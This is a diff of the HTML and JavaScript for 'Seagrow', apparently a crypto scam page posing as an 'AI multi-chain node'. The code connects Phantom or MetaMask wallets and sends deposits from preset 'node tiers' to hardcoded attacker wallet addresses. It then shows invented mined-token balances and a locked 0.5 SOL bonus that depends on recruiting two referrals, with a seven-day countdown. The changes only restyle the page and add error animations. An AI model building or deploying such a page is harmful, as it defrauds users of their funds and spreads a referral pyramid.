@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seagrow | AI Node Protocol</title>
+    <title>Seagrow | AI Multi-Chain Node</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
@@ -11,191 +11,199 @@
         @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Outfit:wght@300;600&display=swap');
         body { font-family: 'Outfit', sans-serif; background: #000; color: white; overflow-x: hidden; }
         .mono { font-family: 'Space Mono', monospace; }
-        .glass { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
+        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); }
         .hidden { display: none; }
-        .bot-glow { box-shadow: 0 0 20px rgba(34, 197, 94, 0.2); }
-        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
+        
+        /* 🚨 ERROR STATES */
+        .error-state { border-color: #ef4444 !important; box-shadow: 0 0 30px rgba(239, 68, 68, 0.4) !important; background: rgba(69, 10, 10, 0.6) !important; }
+        .shake { animation: shake 0.4s ease-in-out; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
+        
+        /* 🟢 SUCCESS STATES */
+        .bot-glow { box-shadow: 0 0 20px rgba(34, 197, 94, 0.3); }
         .scanline { width: 100%; height: 2px; background: rgba(34, 197, 94, 0.1); position: absolute; animation: scan 4s linear infinite; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
-    <canvas id="bg-canvas"></canvas>
-
-    <div id="bot-overlay" class="fixed top-6 left-1/2 -translate-x-1/2 z-50 w-[90%] max-w-sm glass rounded-2xl p-4 border-green-500/30 flex items-center space-x-4 bot-glow">
-        <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-xl animate-pulse">🤖</div>
+    <div id="bot-overlay" class="fixed top-6 left-1/2 -translate-x-1/2 z-50 w-[95%] max-w-sm glass rounded-3xl p-4 border-green-500/30 flex items-center space-x-4 bot-glow transition-all duration-300">
+        <div id="bot-icon" class="w-12 h-12 bg-green-500 rounded-2xl flex items-center justify-center text-2xl animate-pulse">🤖</div>
         <div>
-            <p class="text-[9px] font-black text-green-500 uppercase tracking-widest">Seagrow_System_Bot</p>
-            <p id="bot-text" class="text-[11px] text-slate-200 font-bold italic">Node security check: Pass.</p>
+            <p id="bot-title" class="text-[9px] font-black text-green-500 uppercase tracking-widest">Seagrow_System_v4</p>
+            <p id="bot-text" class="text-[11px] text-slate-200 font-bold italic">Awaiting secure handshake...</p>
         </div>
     </div>
 
-    <div id="step-intro" class="max-w-md w-full glass rounded-[2.5rem] p-10 text-center shadow-2xl border-green-500/20">
-        <h1 class="text-4xl font-black mb-1 italic uppercase tracking-tighter italic">SEA<span class="text-green-500">GROW</span></h1>
-        <p class="text-[10px] text-slate-500 uppercase tracking-[0.4em] mb-10 font-bold">Encrypted Node Access</p>
-        
-        <div class="space-y-3">
-            <button onclick="connectSolana()" class="w-full bg-white text-black py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-green-400 transition">Connect Phantom (SOL)</button>
-            <button onclick="connectEthereum()" class="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-indigo-500 transition">Connect MetaMask (ETH)</button>
-        </div>
-
-        <div class="mt-8 pt-6 border-t border-white/5 flex justify-center space-x-6">
-            <a href="https://t.me/SeagroL" target="_blank" class="flex flex-col items-center opacity-60 hover:opacity-100 transition">
-                <span class="text-indigo-400 text-lg">✈️</span>
-                <span class="text-[8px] font-black text-slate-500 uppercase">Telegram</span>
-            </a>
-            <a href="https://whatsapp.com/channel/0029VbCCCXAIXnljOhvuld3W" target="_blank" class="flex flex-col items-center opacity-60 hover:opacity-100 transition">
-                <span class="text-green-400 text-lg">💬</span>
-                <span class="text-[8px] font-black text-slate-500 uppercase">WhatsApp</span>
-            </a>
-        </div>
-    </div>
-
-    <div id="step-deposit" class="hidden max-w-lg w-full glass rounded-[2.5rem] p-8 text-center border-indigo-500/20">
-        <h2 class="text-2xl font-black uppercase mb-8 italic">Activate <span class="text-indigo-400">Pro Node</span></h2>
-        <div id="tier-container" class="space-y-4 mb-8"></div>
-        <button id="pay-btn" disabled class="w-full bg-slate-800 text-slate-500 py-5 rounded-2xl font-black text-xs uppercase tracking-widest">Select Tier</button>
-    </div>
-
-    <div id="step-mini" class="hidden max-w-3xl w-full glass rounded-[2.5rem] p-8 shadow-2xl relative">
+    <div id="step-intro" class="max-w-md w-full glass rounded-[3rem] p-10 text-center shadow-2xl border-white/10 relative">
         <div class="scanline"></div>
-        <div class="flex justify-between items-center mb-10 relative z-10">
+        <h1 class="text-4xl font-black mb-1 italic uppercase tracking-tighter">SEA<span class="text-green-500">GROW</span></h1>
+        <p class="text-[10px] text-slate-500 uppercase tracking-[0.4em] mb-12 font-bold">Encrypted Multi-Chain Node</p>
+        
+        <div class="space-y-4">
+            <button onclick="connectWallet('SOL')" class="w-full bg-white text-black py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-green-400 transition transform active:scale-95">Phantom (Solana)</button>
+            <button onclick="connectWallet('ETH')" class="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-indigo-500 transition transform active:scale-95">MetaMask (Ethereum)</button>
+        </div>
+
+        <div class="mt-10 pt-8 border-t border-white/5 flex justify-center space-x-8">
+            <a href="https://t.me/SeagroL" target="_blank" class="flex flex-col items-center opacity-50 hover:opacity-100 transition">
+                <span class="text-indigo-400 text-xl">✈️</span>
+                <span class="text-[8px] font-black uppercase mt-1">Telegram</span>
+            </a>
+            <a href="https://whatsapp.com/channel/0029VbCCCXAIXnljOhvuld3W" target="_blank" class="flex flex-col items-center opacity-50 hover:opacity-100 transition">
+                <span class="text-green-400 text-xl">💬</span>
+                <span class="text-[8px] font-black uppercase mt-1">WhatsApp</span>
+            </a>
+        </div>
+    </div>
+
+    <div id="step-deposit" class="hidden max-w-lg w-full glass rounded-[3rem] p-8 text-center border-indigo-500/20">
+        <h2 class="text-2xl font-black uppercase mb-2 italic">Node <span class="text-indigo-400">Upgrade</span></h2>
+        <p class="text-[10px] text-slate-500 uppercase tracking-widest mb-10 font-bold">Deposit to initialize $SEA mining</p>
+        <div id="tier-container" class="space-y-4 mb-10"></div>
+        <button id="pay-btn" disabled class="w-full bg-slate-800 text-slate-500 py-6 rounded-[2rem] font-black text-xs uppercase tracking-widest transition">Initialize Selected Tier</button>
+    </div>
+
+    <div id="step-mini" class="hidden max-w-4xl w-full glass rounded-[3rem] p-8 shadow-2xl relative">
+        <div class="scanline"></div>
+        <div class="flex justify-between items-center mb-12">
             <div>
-                <h2 class="text-3xl font-black italic uppercase tracking-tighter">NODE_DASHBOARD</h2>
-                <p id="user-display" class="text-[10px] mono text-slate-500">PROTOCOL: ACTIVE</p>
+                <h2 class="text-3xl font-black italic uppercase tracking-tighter">NODE_ACTIVE</h2>
+                <p id="user-display" class="text-[10px] mono text-slate-500 uppercase">Status: Mining Secured</p>
             </div>
-            <a href="https://t.me/SeagroL" target="_blank" class="bg-indigo-600 px-4 py-2 rounded-xl text-[9px] font-black uppercase tracking-widest">Support</a>
-        </div>
-
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
-            <div class="bg-white/5 p-6 rounded-3xl border border-white/5 text-center">
-                <p class="text-[9px] text-slate-500 uppercase font-bold mb-2">Seagrow Allocation</p>
-                <p id="sea-balance" class="text-3xl font-black mono text-green-400 italic">0</p>
-                <p class="text-[9px] text-green-500/50 uppercase mt-1 tracking-widest">$SEA Tokens</p>
-            </div>
-            <div class="bg-white/5 p-6 rounded-3xl border border-white/5 text-center">
-                <p class="text-[9px] text-slate-500 uppercase font-bold mb-2">Locked Bonus</p>
-                <p class="text-3xl font-black mono text-indigo-400 italic">0.5</p>
-                <p class="text-[9px] text-indigo-500/50 uppercase mt-1 tracking-widest">SOL Reward</p>
-            </div>
-            <div class="bg-white/5 p-6 rounded-3xl border border-white/5 text-center">
-                <p class="text-[9px] text-slate-500 uppercase font-bold mb-2">Referral Goal</p>
-                <p class="text-3xl font-black mono text-white italic">0/2</p>
-                <p class="text-[9px] text-slate-500 uppercase mt-1 tracking-widest">Complete to Unlock</p>
+            <div class="bg-green-500/10 px-5 py-2 rounded-full border border-green-500/30 flex items-center space-x-2">
+                <div class="w-2 h-2 bg-green-500 rounded-full animate-ping"></div>
+                <span class="text-[9px] font-black text-green-400 uppercase tracking-widest">Live Yield</span>
             </div>
         </div>
 
-        <div class="bg-slate-950/80 p-8 rounded-[2rem] border border-white/5 text-center mb-6">
-            <div class="flex items-center justify-center space-x-2 mb-4">
-                <span class="text-xs font-black text-slate-500 uppercase tracking-widest">Withdrawal Portal</span>
-                <span class="bg-red-500/20 text-red-500 text-[8px] font-black px-2 py-0.5 rounded-full border border-red-500/30 uppercase">Locked</span>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+            <div class="bg-white/5 p-8 rounded-[2.5rem] border border-white/5 text-center">
+                <p class="text-[9px] text-slate-500 uppercase font-black mb-3">Mined $SEA</p>
+                <p id="sea-balance" class="text-4xl font-black mono text-green-400 italic">0</p>
             </div>
-            <div id="countdown" class="text-4xl font-black mono mb-6 opacity-40">07:00:00:00</div>
+            <div class="bg-white/5 p-8 rounded-[2.5rem] border border-white/5 text-center">
+                <p class="text-[9px] text-slate-500 uppercase font-black mb-3">Pending Bonus</p>
+                <p class="text-4xl font-black mono text-indigo-400 italic">0.5</p>
+                <p class="text-[9px] text-indigo-400/50 uppercase mt-1">SOL Reward</p>
+            </div>
+            <div class="bg-white/5 p-8 rounded-[2.5rem] border border-white/5 text-center">
+                <p class="text-[9px] text-slate-500 uppercase font-black mb-3">Ref Count</p>
+                <p class="text-4xl font-black mono text-white italic">0/2</p>
+            </div>
+        </div>
+
+        <div class="bg-black/60 p-10 rounded-[2.5rem] border border-white/10 text-center">
+            <p class="text-[10px] text-slate-400 uppercase tracking-[0.4em] mb-6 font-bold">Withdrawal Terminal</p>
+            <div id="countdown" class="text-4xl font-black mono mb-10 opacity-40">07:00:00:00</div>
             
-            <div class="space-y-4">
-                <div class="flex items-center space-x-3 bg-black/40 p-4 rounded-2xl border border-white/5">
-                    <input id="ref-link" readonly type="text" placeholder="Upgrade to reveal link..." class="bg-transparent text-[10px] mono text-slate-600 outline-none w-full">
-                    <button onclick="copyRef()" class="text-[9px] font-black text-indigo-400 uppercase">Copy</button>
-                </div>
-                <button disabled class="w-full bg-slate-800 text-slate-600 py-4 rounded-2xl font-black text-xs uppercase tracking-widest cursor-not-allowed">Claim 0.5 SOL Bonus</button>
+            <div class="bg-white/5 p-5 rounded-3xl border border-white/5 mb-6 flex items-center space-x-4">
+                <input id="ref-link" readonly type="text" value="Connect to generate link..." class="bg-transparent text-[10px] mono text-indigo-300 outline-none w-full italic">
+                <button onclick="copyRef()" class="text-[9px] font-black text-white bg-indigo-600 px-4 py-2 rounded-xl uppercase">Copy</button>
             </div>
-            <p class="mt-6 text-[9px] text-slate-500 uppercase leading-loose">The bonus claim will activate automatically after <span class="text-white">2 successful referrals</span> join the Seagrow network via your link.</p>
+            <button disabled class="w-full bg-slate-900 text-slate-700 py-5 rounded-[2rem] font-black text-xs uppercase tracking-widest cursor-not-allowed">Claim 0.5 SOL Seeding Bonus</button>
         </div>
     </div>
 
     <script>
-        const MY_SOL_WALLET = "y8Wpib1WMJ23CLicgDNh3RSVdN1wzeJJPEue2RvA6fd";
-        const MY_ETH_WALLET = "0x06e921538fc2d6dCe385077c6A1B4dA189406891";
-        
-        let activeNetwork = "";
-        let seaTokens = 0;
+        // --- SETTINGS ---
+        const WALLETS = { SOL: "y8Wpib1WMJ23CLicgDNh3RSVdN1wzeJJPEue2RvA6fd", ETH: "0x06e921538fc2d6dCe385077c6A1B4dA189406891" };
+        let currentChain = ""; 
         let userAddr = "";
 
-        function updateBot(text) { document.getElementById('bot-text').innerText = text; }
-
-        async function connectSolana() {
-            if (window.solana?.isPhantom) {
-                const resp = await window.solana.connect();
-                activeNetwork = "SOL";
-                userAddr = resp.publicKey.toString();
-                updateBot("Solana Node Linked. Prepare for seeding.");
-                renderTiers([{ amt: 0.05, tokens: 5000 }, { amt: 0.1, tokens: 12000 }]);
-                showStep('step-deposit');
-            } else alert("Phantom required");
+        function triggerError(msg) {
+            const bot = document.getElementById('bot-overlay');
+            const botIcon = document.getElementById('bot-icon');
+            bot.classList.add('error-state', 'shake');
+            botIcon.innerText = "⚠️";
+            botIcon.classList.replace('bg-green-500', 'bg-red-500');
+            document.getElementById('bot-title').innerText = "SYSTEM_ERROR";
+            document.getElementById('bot-text').innerText = msg;
+            
+            setTimeout(() => {
+                bot.classList.remove('error-state', 'shake');
+                botIcon.innerText = "🤖";
+                botIcon.classList.replace('bg-red-500', 'bg-green-500');
+                document.getElementById('bot-title').innerText = "Seagrow_System_v4";
+            }, 3000);
         }
 
-        async function connectEthereum() {
-            if (window.ethereum) {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                activeNetwork = "ETH";
-                userAddr = accounts[0];
-                updateBot("Ethereum Node Linked. High-yield tiers ready.");
-                renderTiers([{ amt: 0.005, tokens: 6500 }, { amt: 0.01, tokens: 15000 }]);
+        function updateBot(msg) { document.getElementById('bot-text').innerText = msg; }
+
+        async function connectWallet(chain) {
+            try {
+                if (chain === 'SOL') {
+                    if (!window.solana?.isPhantom) throw new Error("Phantom not detected");
+                    const resp = await window.solana.connect();
+                    userAddr = resp.publicKey.toString();
+                    renderTiers([{amt: 0.05, tk: 5000}, {amt: 0.1, tk: 12000}]);
+                } else {
+                    if (!window.ethereum) throw new Error("MetaMask not detected");
+                    const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAddr = accs[0];
+                    renderTiers([{amt: 0.005, tk: 6000}, {amt: 0.01, tk: 15000}]);
+                }
+                currentChain = chain;
+                updateBot(`${chain} Node Connected. Select Tier.`);
                 showStep('step-deposit');
-            } else alert("MetaMask required");
+            } catch (e) { triggerError(e.message); }
         }
 
         function renderTiers(tiers) {
-            const container = document.getElementById('tier-container');
-            container.innerHTML = '';
+            const cont = document.getElementById('tier-container');
+            cont.innerHTML = '';
             tiers.forEach(t => {
-                const div = document.createElement('div');
-                div.className = "p-5 rounded-2xl border border-white/5 bg-white/5 hover:border-green-500 transition cursor-pointer flex justify-between items-center group";
-                div.onclick = () => selectTier(t.amt, t.tokens);
-                div.innerHTML = `<span class="font-black uppercase italic italic text-sm group-hover:text-green-400">${t.amt} ${activeNetwork} Node</span><span class="text-slate-500 font-black">+${t.tokens} $SEA</span>`;
-                container.appendChild(div);
+                const d = document.createElement('div');
+                d.className = "p-5 rounded-3xl border border-white/5 bg-white/5 hover:border-indigo-500 transition cursor-pointer flex justify-between items-center group";
+                d.onclick = () => selectTier(t.amt, t.tk);
+                d.innerHTML = `<span class="font-black italic uppercase italic text-sm group-hover:text-indigo-400">${t.amt} ${currentChain} Node</span><span class="text-slate-500 font-bold">+${t.tk} $SEA</span>`;
+                cont.appendChild(d);
             });
         }
 
-        function selectTier(amt, tokens) {
+        function selectTier(amt, tk) {
             const btn = document.getElementById('pay-btn');
             btn.disabled = false;
-            btn.innerText = `INITIALIZE PROTOCOL (${amt} ${activeNetwork})`;
-            btn.className = "w-full bg-green-600 text-white py-5 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-green-500/20 transition";
-            
-            btn.onclick = async () => {
-                updateBot("Transmitting energy... Do not refresh.");
-                try {
-                    if (activeNetwork === "SOL") {
-                        const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-                        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: window.solana.publicKey, toPubkey: new solanaWeb3.PublicKey(MY_SOL_WALLET), lamports: amt * 1e9,
-                        }));
-                        tx.feePayer = window.solana.publicKey;
-                        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-                        await window.solana.signAndSendTransaction(tx);
-                    } else {
-                        const provider = new ethers.providers.Web3Provider(window.ethereum);
-                        const signer = provider.getSigner();
-                        const tx = await signer.sendTransaction({ to: MY_ETH_WALLET, value: ethers.utils.parseEther(amt.toString()) });
-                        await tx.wait();
-                    }
-                    unlockPro(tokens);
-                } catch (e) { updateBot("Handshake failed. Try again."); }
-            };
+            btn.innerText = `ACTIVATE NODE (${amt} ${currentChain})`;
+            btn.className = "w-full bg-indigo-600 text-white py-6 rounded-[2rem] font-black text-xs uppercase tracking-widest shadow-2xl shadow-indigo-600/30 transition transform active:scale-95";
+            btn.onclick = () => processPayment(amt, tk);
         }
 
-        function unlockPro(tokens) {
-            document.getElementById('sea-balance').innerText = tokens.toLocaleString();
-            document.getElementById('ref-link').value = `https://seagrow.ai/join?ref=${userAddr.slice(0,6)}`;
-            document.getElementById('ref-link').className = "bg-transparent text-[10px] mono text-indigo-400 outline-none w-full";
-            updateBot("UPGRADE COMPLETE. Bonus pool unlocked.");
-            showStep('step-mini');
-            startCountdown();
+        async function processPayment(amt, tk) {
+            updateBot("Verifying transaction... Check wallet pop-up.");
+            try {
+                if (currentChain === 'SOL') {
+                    const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                    const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: window.solana.publicKey, toPubkey: new solanaWeb3.PublicKey(WALLETS.SOL), lamports: amt * 1e9,
+                    }));
+                    tx.feePayer = window.solana.publicKey;
+                    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+                    await window.solana.signAndSendTransaction(tx);
+                } else {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const tx = await provider.getSigner().sendTransaction({ to: WALLETS.ETH, value: ethers.utils.parseEther(amt.toString()) });
+                    await tx.wait();
+                }
+                // SUCCESS
+                document.getElementById('sea-balance').innerText = tk.toLocaleString();
+                document.getElementById('ref-link').value = `https://seagrow.ai/mining?id=${userAddr.slice(0,8)}`;
+                updateBot("Payment Confirmed. Loading Dashboard...");
+                showStep('step-mini');
+                startCountdown();
+            } catch (e) {
+                triggerError("Transaction Failed / Rejected");
+            }
         }
 
         function startCountdown() {
-            let total = 7 * 24 * 3600;
-            const disp = document.getElementById('countdown');
-            disp.style.opacity = 1;
+            let t = 7 * 86400;
+            const el = document.getElementById('countdown');
+            el.style.opacity = 1;
             setInterval(() => {
-                const d = Math.floor(total / 86400);
-                const h = Math.floor((total % 86400) / 3600);
-                const m = Math.floor((total % 3600) / 60);
-                const s = total % 60;
-                disp.innerText = `${String(d).padStart(2,'0')}:${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-                if (total > 0) total--;
+                const d = Math.floor(t / 86400), h = Math.floor((t % 86400) / 3600), m = Math.floor((t % 3600) / 60), s = t % 60;
+                el.innerText = `${String(d).padStart(2,'0')}:${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+                if (t > 0) t--;
             }, 1000);
         }
 
@@ -204,19 +212,7 @@
             document.getElementById(id).classList.remove('hidden');
         }
 
-        function copyRef() {
-            const input = document.getElementById("ref-link");
-            if (input.value) { input.select(); navigator.clipboard.writeText(input.value); alert("Referral Bridge Copied!"); }
-        }
-
-        // --- BACKGROUND ---
-        const canvas = document.getElementById('bg-canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        let p = [];
-        function initBg() { for(let i=0;i<50;i++) p.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,s:Math.random()*1.5}); animate(); }
-        function animate() { ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle="#22c55e"; p.forEach(i=>{ctx.beginPath();ctx.arc(i.x,i.y,i.s,0,7);ctx.fill();i.y-=0.4;if(i.y<0)i.y=canvas.height;}); requestAnimationFrame(animate); }
-        window.onload = initBg;
+        function copyRef() { const input = document.getElementById("ref-link"); input.select(); navigator.clipboard.writeText(input.value); alert("Referral Link Copied!"); }
     </script>
 </body>
 </html>
